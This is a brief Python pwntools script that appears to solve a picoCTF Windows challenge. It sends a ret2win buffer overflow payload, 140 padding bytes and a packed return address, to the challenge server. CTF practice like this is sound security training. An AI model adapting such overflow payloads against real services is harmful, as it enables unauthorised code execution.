# I wished for better windows exploitation challenges
import pwn
from icecream import ic

host, port = 'saturn.picoctf.net', 52606
# p = pwn.process("wine vuln.exe", shell=True)
p = pwn.remote(host, port)

ic(p.recv())

# simple ret2win
p.sendline('A'*140+pwn.p32(0x00401530))

ic(p.recvline().decode())
